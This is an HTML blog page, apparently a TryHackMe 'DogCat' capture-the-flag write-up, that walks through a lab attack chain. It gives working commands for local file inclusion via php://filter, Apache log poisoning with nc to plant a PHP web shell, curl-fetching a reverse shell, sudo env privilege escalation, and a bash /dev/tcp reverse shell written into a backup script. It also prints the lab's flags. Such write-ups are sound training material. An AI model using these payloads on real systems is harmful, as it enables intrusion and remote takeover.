@@ -1,0 +1,473 @@
+<!DOCTYPE html>
+<html lang="zh">
+    
+    
+
+
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <link href="https://gmpg.org/xfn/11" rel="profile">
+    
+    <link rel="canonical" href="http://localhost:1313/thm/dogcat/">
+    
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<!-- Enable responsiveness on mobile devices -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="generator" content="Hugo 0.131.0">
+
+    
+    
+    
+
+<title>DogCat • Cookie網</title>
+
+
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="DogCat">
+  <meta name="twitter:description" content="DOGCAT FLAG1 First, I press F12 want to find any clue, but I don’y find.
+Seccond, I press DOG and CAT button, I got a lot cute picture, and I know view only allow dog or cat word. Now I try php wraper to take web code.
+http://10.10.162.32//?view=php://filter/convert.base64-encode/resource=dog Got a text base on base64. Decode, and then we know cute picture will be readomly picked out of ten.
+Now, we try to take /etc/passwd">
+
+<meta property="og:url" content="http://localhost:1313/thm/dogcat/">
+  <meta property="og:site_name" content="Cookie網">
+  <meta property="og:title" content="DogCat">
+  <meta property="og:description" content="DOGCAT FLAG1 First, I press F12 want to find any clue, but I don’y find.
+Seccond, I press DOG and CAT button, I got a lot cute picture, and I know view only allow dog or cat word. Now I try php wraper to take web code.
+http://10.10.162.32//?view=php://filter/convert.base64-encode/resource=dog Got a text base on base64. Decode, and then we know cute picture will be readomly picked out of ten.
+Now, we try to take /etc/passwd">
+  <meta property="og:locale" content="zh">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="thm">
+    <meta property="article:published_time" content="2024-09-12T23:14:19-04:00">
+    <meta property="article:modified_time" content="2024-09-12T23:14:19-04:00">
+
+
+    
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.4.0/styles/github.min.css">
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/scss/triple-hyde.ef937e1c8a424ea6419b858ae4cfbdb5f7e764eb1075e9ac50fa2de759dde8a2.css" integrity="sha256-75N&#43;HIpCTqZBm4WK5M&#43;9tffnZOsQdemsUPot51nd6KI=">
+
+
+<link rel="stylesheet" href="/scss/print.2744dcbf8a0b2e74f8a50e4b34e5f441be7cf93cc7de27029121c6a09f9e77bc.css" integrity="sha256-J0Tcv4oLLnT4pQ5LNOX0Qb58&#43;TzH3icCkSHGoJ&#43;ed7w=" media="print">
+
+
+
+    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+    <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
+    <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+    <![endif]-->
+    <!-- Icons -->
+    <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/apple-touch-icon-144-precomposed.png">
+    <link rel="shortcut icon" href="/favicon.png">
+    
+    
+
+</head>
+
+
+    <body class=" ">
+    
+<div class="sidebar">
+  <div class="container ">
+    <div class="sidebar-about">
+  <span class="site__title">
+    <a href="http://localhost:1313/">
+    
+      Cookie網
+    
+    </a>
+  </span>
+  
+    
+    
+    
+    <div class="author-image">
+      <img src="http://localhost:1313/img/Q_shiba.png" alt="Author Image" class="img--circle img--headshot element--center">
+    </div>
+    
+  
+  
+  <p class="site__description">
+     努力奮發向上的鹹魚 
+  </p>
+</div>
+
+    <div class="collapsible-menu">
+      <input type="checkbox" id="menuToggle">
+      <label for="menuToggle">Cookie網</label>
+      <div class="menu-content">
+        <div>
+	<ul class="sidebar-nav">
+		 
+		 
+			 
+				<li>
+					<a href="/posts/">
+						<span>Posts</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/thm/">
+						<span>Try Hack Me Write Up</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/icons/">
+						<span>Icons</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/about/">
+						<span>About</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/test/">
+						<span>測試東西</span>
+					</a>
+				</li>
+			 
+		
+	</ul>
+</div>
+
+        <section class="social">
+	
+	
+	
+	<a href="https://github.com/jim091418" rel="me">
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+
+  </span>
+
+</a>
+	
+	
+	
+	
+	
+	<a href="https://instagram.com/jim940037" rel="me">
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M224.1 141c-63.6 0-114.9 51.3-114.9 114.9s51.3 114.9 114.9 114.9S339 319.5 339 255.9 287.7 141 224.1 141zm0 189.6c-41.1 0-74.7-33.5-74.7-74.7s33.5-74.7 74.7-74.7 74.7 33.5 74.7 74.7-33.6 74.7-74.7 74.7zm146.4-194.3c0 14.9-12 26.8-26.8 26.8-14.9 0-26.8-12-26.8-26.8s12-26.8 26.8-26.8 26.8 12 26.8 26.8zm76.1 27.2c-1.7-35.9-9.9-67.7-36.2-93.9-26.2-26.2-58-34.4-93.9-36.2-37-2.1-147.9-2.1-184.9 0-35.8 1.7-67.6 9.9-93.9 36.1s-34.4 58-36.2 93.9c-2.1 37-2.1 147.9 0 184.9 1.7 35.9 9.9 67.7 36.2 93.9s58 34.4 93.9 36.2c37 2.1 147.9 2.1 184.9 0 35.9-1.7 67.7-9.9 93.9-36.2 26.2-26.2 34.4-58 36.2-93.9 2.1-37 2.1-147.8 0-184.8zM398.8 388c-7.8 19.6-22.9 34.7-42.6 42.6-29.5 11.7-99.5 9-132.1 9s-102.7 2.6-132.1-9c-19.6-7.8-34.7-22.9-42.6-42.6-11.7-29.5-9-99.5-9-132.1s-2.6-102.7 9-132.1c7.8-19.6 22.9-34.7 42.6-42.6 29.5-11.7 99.5-9 132.1-9s102.7-2.6 132.1 9c19.6 7.8 34.7 22.9 42.6 42.6 11.7 29.5 9 99.5 9 132.1s2.7 102.7-9 132.1z"/></svg>
+
+  </span>
+
+</a>
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	<a href="mailto:jim091418@gamil.com" rel="me">
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M207.8 20.73c-93.45 18.32-168.7 93.66-187 187.1c-27.64 140.9 68.65 266.2 199.1 285.1c19.01 2.888 36.17-12.26 36.17-31.49l.0001-.6631c0-15.74-11.44-28.88-26.84-31.24c-84.35-12.98-149.2-86.13-149.2-174.2c0-102.9 88.61-185.5 193.4-175.4c91.54 8.869 158.6 91.25 158.6 183.2l0 16.16c0 22.09-17.94 40.05-40 40.05s-40.01-17.96-40.01-40.05v-120.1c0-8.847-7.161-16.02-16.01-16.02l-31.98 .0036c-7.299 0-13.2 4.992-15.12 11.68c-24.85-12.15-54.24-16.38-86.06-5.106c-38.75 13.73-68.12 48.91-73.72 89.64c-9.483 69.01 43.81 128 110.9 128c26.44 0 50.43-9.544 69.59-24.88c24 31.3 65.23 48.69 109.4 37.49C465.2 369.3 496 324.1 495.1 277.2V256.3C495.1 107.1 361.2-9.332 207.8 20.73zM239.1 304.3c-26.47 0-48-21.56-48-48.05s21.53-48.05 48-48.05s48 21.56 48 48.05S266.5 304.3 239.1 304.3z"/></svg>
+
+  </span>
+
+</a>
+	
+	
+	
+	
+	
+</section>
+
+      </div>
+    </div>
+    
+<div class="copyright">
+  &copy; 2023 - 2024 derme302
+  
+    <a href="">jimtang</a>
+  
+</div>
+
+
+<div class="builtwith">
+Built with <a href="https://gohugo.io">Hugo</a> ❤️ <a href="https://github.com/derme302/triple-hyde">triple-hyde</a>.
+</div>
+
+
+  </div>
+</div>
+
+        <div class="content container">
+            
+    
+<article>
+  <header>
+    <h1>DogCat</h1>
+    
+    
+<div class="post__meta">
+    
+    
+      <i class="fas fa-calendar-alt"></i> Sep 12, 2024
+    
+    
+    
+    
+    
+    <br/>
+    <i class="fas fa-clock"></i> 4 min read
+</div>
+
+
+  </header>
+  
+  
+  <div class="post">
+    <h1 id="dogcat">DOGCAT</h1>
+<ul>
+<li><input checked="" disabled="" type="checkbox"> FLAG1</li>
+</ul>
+<p>First, I press F12 want to find any clue, but I don&rsquo;y find.<br>
+Seccond, I press DOG and CAT button, I got a lot cute picture, and I know <strong>view</strong> only allow dog or cat word.
+<img src="https://user-images.githubusercontent.com/67756786/195544351-dca3ecb7-941a-4f6d-b731-c2a414ddc0cb.png" alt="image"></p>
+<p>Now I try <strong>php wraper</strong> to take web code.</p>
+<pre tabindex="0"><code>http://10.10.162.32//?view=php://filter/convert.base64-encode/resource=dog
+</code></pre><p>Got a text base on base64.
+<img src="https://user-images.githubusercontent.com/67756786/195545334-346cbd14-f4cd-4693-a74c-26a52680e9f3.png" alt="image"></p>
+<p>Decode, and then we know cute picture will be readomly picked out of ten.</p>
+<p><img src="https://user-images.githubusercontent.com/67756786/195545544-018317ee-f418-41e9-956d-fdaac5b585d7.png" alt="image"></p>
+<p>Now, we try to take /etc/passwd</p>
+<pre tabindex="0"><code>http://10.10.162.32//?view=php://filter/convert.base64-encode/resource=dog/../../../../etc/passwd
+</code></pre><p>First warring message is talk about path error, and it show us path is dog/../../../../etc/passwd.php.
+Obviously, web code should be <strong>include(_GET(view).php)</strong></p>
+<p><img src="https://user-images.githubusercontent.com/67756786/195548462-a80629d6-aa6b-4645-b9ac-78ab62662eba.png" alt="image"></p>
+<p>We use %00 to comment that.
+Path is correct but still got error.
+<img src="https://user-images.githubusercontent.com/67756786/195550444-82fc62ef-cd2c-4f00-ae25-ae96617249cc.png" alt="image"></p>
+<p>Now we need to know that the web how to write.</p>
+<pre tabindex="0"><code>http://10.10.162.32//?view=php://filter/convert.base64-encode/resource=dog/../index
+</code></pre><p><img src="https://user-images.githubusercontent.com/67756786/195551181-9ca38a4e-946e-4e4f-a94f-7ac00307154e.png" alt="image"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE HTML&gt;</span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">head</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">title</span>&gt;dogcat&lt;/<span style="color:#f92672">title</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">link</span> <span style="color:#a6e22e">rel</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/css&#34;</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/style.css&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">head</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">h1</span>&gt;dogcat&lt;/<span style="color:#f92672">h1</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">i</span>&gt;a gallery of various dogs or cats&lt;/<span style="color:#f92672">i</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">div</span>&gt;
+</span></span><span style="display:flex;"><span>        &lt;<span style="color:#f92672">h2</span>&gt;What would you like to see?&lt;/<span style="color:#f92672">h2</span>&gt;
+</span></span><span style="display:flex;"><span>        &lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/?view=dog&#34;</span>&gt;&lt;<span style="color:#f92672">button</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;dog&#34;</span>&gt;A dog&lt;/<span style="color:#f92672">button</span>&gt;&lt;/<span style="color:#f92672">a</span>&gt; &lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/?view=cat&#34;</span>&gt;&lt;<span style="color:#f92672">button</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;cat&#34;</span>&gt;A cat&lt;/<span style="color:#f92672">button</span>&gt;&lt;/<span style="color:#f92672">a</span>&gt;&lt;<span style="color:#f92672">br</span>&gt;
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">&lt;?php
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">            function containsStr($str, $substr) {
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">                return strpos($str, $substr) !== false;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">            }
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	    $ext = isset($_GET[&#34;ext&#34;]) ? $_GET[&#34;ext&#34;] : &#39;.php&#39;;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">            if(isset($_GET[&#39;view&#39;])) {
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">                if(containsStr($_GET[&#39;view&#39;], &#39;dog&#39;) || containsStr($_GET[&#39;view&#39;], &#39;cat&#39;)) {
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">                    echo &#39;Here you go!&#39;;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">                    include $_GET[&#39;view&#39;] . $ext;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">                } else {
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">                    echo &#39;Sorry, only dogs or cats are allowed.&#39;;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">                }
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">            }
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">        ?&gt;</span>
+</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#f92672">div</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">html</span>&gt;
+</span></span></code></pre></div><p>According to index.php source code, we know we have two variable , and we can use GET to change them.
+One of variable, ext, it&rsquo;s default value is .php,No wonder we use /etc/passwd to LFI will get error.</p>
+<p>Now we need check /etc/passwd again.</p>
+<pre tabindex="0"><code>http://10.10.162.32//?view=php://filter/convert.base64-encode/resource=dog/../../../../etc/passwd&amp;ext=
+</code></pre><p>work!
+<img src="https://user-images.githubusercontent.com/67756786/195553839-b10f7fb6-023f-4d19-9844-9ffe524981b8.png" alt="image"></p>
+<p>Then we need to find where can excute RCE vulnerable.<br>
+First, confirm what web server</p>
+<p><img src="https://user-images.githubusercontent.com/67756786/195554515-62f65ee8-f2d2-4730-b4f6-4a17e62a6bbf.png" alt="image"></p>
+<p>Second, confirm where apache log file
+<img src="https://user-images.githubusercontent.com/67756786/195555607-9db42cbd-a824-4ea2-8e19-c1785156e75b.png" alt="image"></p>
+<p>Finaly, try to got apache access.log</p>
+<pre tabindex="0"><code>http://10.10.162.32//?view=dog/../../../../var/log/apache2/access&amp;ext=.log
+</code></pre><p>Work, nice!
+<img src="https://user-images.githubusercontent.com/67756786/195556701-5a70e822-e099-4857-9d17-e43fd7adffd4.png" alt="image"></p>
+<p>Now we try access.log can injection or not.</p>
+<pre tabindex="0"><code>echo -e &#34;GET &lt;?php phpinfo(); ?&gt;&#34;| nc 10.10.162.32 80
+</code></pre><p>Work
+<img src="https://user-images.githubusercontent.com/67756786/195557135-6a978839-dad3-4fdd-a902-765dc8206e2f.png" alt="image"></p>
+<p>Now I want put web shell into that.</p>
+<pre tabindex="0"><code>echo -e &#34;GET &lt;?php if(isset($_GET[&#39;cmd&#39;]))  {  system($_GET[&#39;cmd&#39;]);  }?&gt;&#34; | nc 10.10.162.32 80
+</code></pre><p>But I got this error message, and then I reboot target machine.
+<img src="https://user-images.githubusercontent.com/67756786/195541111-f95d8e1f-1e61-4993-8f85-7c2c0fa74aa2.png" alt="image"></p>
+<p>And then I think that I just want to print result of excution, after that I change my RCE code.</p>
+<pre tabindex="0"><code> echo -e &#34;&lt;?php system(\$_GET[B]); ?&gt;&#34; | nc 10.10.142.129 80
+</code></pre><p>Success!
+<img src="https://user-images.githubusercontent.com/67756786/195745918-9ef79f1d-3981-4432-8764-c8382e9c0e56.png" alt="image"></p>
+<p>Now we need to uplode php reverse shell and excute it.<br>
+First, uploade php revere shell, we can use python http server and use curl dowload reverse shell.
+Second, excute this reverse shell.
+php reverse shell(<a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php</a>)<br>
+If you reverse shell is ready, we can open python http server
+<img src="https://user-images.githubusercontent.com/67756786/195754923-4cc04d9b-d523-4f31-902c-e1e562060afb.png" alt="image"></p>
+<p>After, we dowload and excute that.<br>
+Dowload</p>
+<pre tabindex="0"><code>http://10.10.142.129/?ext=&amp;view=dog/../../../../var/log/apache2/access.log&amp;B=curl -o /var/www/html/s.php%20http://10.10.180.17/shell.php
+</code></pre><p>Excute</p>
+<pre tabindex="0"><code>http://10.10.142.129/?view=dog/../s
+</code></pre><p>But, got a error message, seem to be not use this method.</p>
+<p><img src="https://user-images.githubusercontent.com/67756786/195755156-0699cb87-02fe-46af-a4b0-3a09d01d1eb2.png" alt="image"></p>
+<p>One day ago, I conscious my dowload URL is error, default port of python http server is 8000.<br>
+Later, I do it again, same method, and work!</p>
+<p>revereshell
+<img src="https://user-images.githubusercontent.com/67756786/195756571-aa5bc548-2fcc-4a9c-a1e6-e935aef44fcd.png" alt="image"></p>
+<p>Now, we need to got four flag! I will use <code>find</code> to search flag</p>
+<pre tabindex="0"><code>find * -name flag*
+</code></pre><p><img src="https://user-images.githubusercontent.com/67756786/195767056-726c156b-0903-4424-9604-1396ff6c6123.png" alt="image"></p>
+<p>and open that.</p>
+<p><img src="https://user-images.githubusercontent.com/67756786/195767322-991d0302-a03d-4ac1-b2b5-c240764b1bea.png" alt="image"></p>
+<ul>
+<li><input checked="" disabled="" type="checkbox"> FLAG2</li>
+</ul>
+<p><img src="https://user-images.githubusercontent.com/67756786/195767344-8ca50948-1b04-47c2-bf49-1986efa95617.png" alt="image"></p>
+<ul>
+<li><input checked="" disabled="" type="checkbox"> FLAG3</li>
+</ul>
+<p>Usually, one of flag will be on the root dictory,and then we confirm www_data to can be root or not.</p>
+<pre tabindex="0"><code>sudo -l
+</code></pre><p><img src="https://user-images.githubusercontent.com/67756786/195769614-9a3adb49-accb-4f09-8af0-1507d7717aaa.png" alt="image"></p>
+<p>GTFOBins have privilege escalation method by env</p>
+<p><img src="https://user-images.githubusercontent.com/67756786/195769742-863b904a-d754-4b83-ba55-24c5c3f5ae07.png" alt="image"></p>
+<p><img src="https://user-images.githubusercontent.com/67756786/195769806-8fe8bd4c-866b-4219-944f-d3ddfd1b566e.png" alt="image"></p>
+<p>flag3 into /root dictory</p>
+<p><img src="https://user-images.githubusercontent.com/67756786/195770951-3eaf770f-00a9-4264-a973-da4db5812396.png" alt="image"></p>
+<ul>
+<li><input checked="" disabled="" type="checkbox"> FLAG4</li>
+</ul>
+<p>在/目錄底下，我發現隱藏目錄.dockerenv，所以目前應該是container環境
+<img src="https://user-images.githubusercontent.com/67756786/195786709-0f4a8036-b4a2-41a2-9ecd-619922b00f87.png" alt="image"></p>
+<p>接著在opt中發現bakcup目錄
+<img src="https://user-images.githubusercontent.com/67756786/195787001-f3465ed3-1557-4bfb-87b6-bd20aecaba10.png" alt="image"></p>
+<p>backup.sh內容為<code>tar cf /root/container/backup/backup.tar /root/container</code></p>
+<p>backup.tar解壓縮後有root/container/目錄，底下有Dockerfile、backup.sh、launch.sh
+Dockerfile</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-docker" data-lang="docker"><span style="display:flex;"><span><span style="color:#66d9ef">FROM</span><span style="color:#e6db74"> php:apache-buster</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#75715e"># Setup document root</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> mkdir -p /var/www/html<span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#75715e"># Make the document root a volume</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">VOLUME</span><span style="color:#e6db74"> /var/www/html</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#75715e"># Add application</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">WORKDIR</span><span style="color:#e6db74"> /var/www/html</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">COPY</span> --chown<span style="color:#f92672">=</span>www-data src/ /var/www/html/<span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> rm /var/log/apache2/*.log<span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#75715e"># Set up escalation</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> chmod +s <span style="color:#e6db74">`</span>which env<span style="color:#e6db74">`</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> apt-get update <span style="color:#f92672">&amp;&amp;</span> apt-get install sudo -y<span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> echo <span style="color:#e6db74">&#34;www-data ALL = NOPASSWD: `which env`&#34;</span> &gt;&gt; /etc/sudoers<span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#75715e"># Write flag</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> echo <span style="color:#e6db74">&#34;THM{D1ff3r3nt_3nv1ronments_874112}&#34;</span> &gt; /root/flag3.txt<span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> chmod <span style="color:#ae81ff">400</span> /root/flag3.txt<span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> echo <span style="color:#e6db74">&#34;THM{LF1_t0_RC3_aec3fb}&#34;</span> &gt; /var/www/flag2_QMW7JvaY2LvK.txt<span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">EXPOSE</span><span style="color:#e6db74"> 80</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#75715e"># Configure a healthcheck to validate that everything is up&amp;running</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">HEALTHCHECK --timeout=10s </span><span style="color:#66d9ef">CMD</span> curl --silent --fail http://127.0.0.1:80/<span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p>launch.sh</p>
+<pre tabindex="0"><code>#!/bin/bash
+docker run -d -p 80:80 -v /root/container/backup:/opt/backups --rm box
+</code></pre><p>接著更改backup.sh</p>
+<pre tabindex="0"><code>echo &#34;echo &#34;#!/bin/bash \n bash -i &gt;&amp; /dev/tcp/10.10.180.17/4242 0&gt;&amp;1&#34; &gt; backup.sh&#34;
+</code></pre><p>監聽4242 port後會發現取得shell，並且為root權限，查看flag4.txt
+<img src="https://user-images.githubusercontent.com/67756786/195788139-a9d0dad3-3a25-45a8-8eab-423e0686af69.png" alt="image"></p>
+<p>確認crontab</p>
+<pre tabindex="0"><code>corntab -l
+</code></pre><p><img src="https://user-images.githubusercontent.com/67756786/195788238-83b05236-ba54-4743-87e0-b6f9447a552f.png" alt="image"></p>
+
+  </div>
+  
+
+<div class="navigation navigation-single">
+    
+    <a href="/thm/simple_ctf/" class="navigation-prev">
+      <i aria-hidden="true" class="fa fa-chevron-left"></i>
+      <span class="navigation-tittle">Simple CTF</span>
+    </a>
+    
+    
+    <a href="/thm/cyborg/" class="navigation-next">
+      <span class="navigation-tittle">Cyborg</span>
+      <i aria-hidden="true" class="fa fa-chevron-right"></i>
+    </a>
+    
+</div>
+
+
+  
+
+  
+    
+
+
+</article>
+
+
+        </div>
+        
+    
+
+
+    
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.4.0/highlight.min.js"></script>
+        
+    <script type="text/javascript">
+        
+        hljs.initHighlightingOnLoad();
+    </script>
+    
+
+
+
+    
+
+
+
+    </body>
+</html>
